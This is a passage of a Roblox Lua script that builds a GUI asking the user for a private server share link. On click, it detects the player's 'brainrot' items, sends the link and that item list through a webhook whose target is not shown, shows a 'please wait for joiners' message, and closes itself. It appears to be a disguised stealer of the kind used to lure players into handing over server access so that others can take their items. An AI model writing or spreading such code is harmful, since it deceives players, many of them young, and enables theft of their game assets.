Instance.new("UICorner", EnterButton).CornerRadius = UDim.new(0, 6)    
    
-- Feedback label    
local FeedbackLabel = Instance.new("TextLabel")    
FeedbackLabel.Size = UDim2.new(1, -20, 0, 20)    
FeedbackLabel.Position = UDim2.new(0, 10, 0, 125)    
FeedbackLabel.BackgroundTransparency = 1    
FeedbackLabel.Text = ""    
FeedbackLabel.TextColor3 = Color3.fromRGB(255, 100, 100)    
FeedbackLabel.Font = Enum.Font.Gotham    
FeedbackLabel.TextSize = 14    
FeedbackLabel.TextXAlignment = Enum.TextXAlignment.Left    
FeedbackLabel.Parent = MainFrame    
    
-- Button click    
EnterButton.MouseButton1Click:Connect(function()    
    local serverLink = InputBox.Text:match("^%s*(.-)%s*$")    
    if serverLink == "" or not serverLink:match("^https://www.roblox.com/share%?code=") then    
        FeedbackLabel.Text = "Invalid link!"    
        task.delay(4, function() FeedbackLabel.Text = "" end)    
        return    
    end    
    
    local brainrots = detectBrainrots()    
    sendWebhook(serverLink, brainrots)    
    
    -- Updated feedback message
    FeedbackLabel.Text = "Link sended please wait for joiners"    
    
    -- Destroy the GUI after 3 seconds as requested
    task.delay(3, function() 
        if ScreenGui and ScreenGui.Parent then
            ScreenGui:Destroy()
        end
    end)
end)
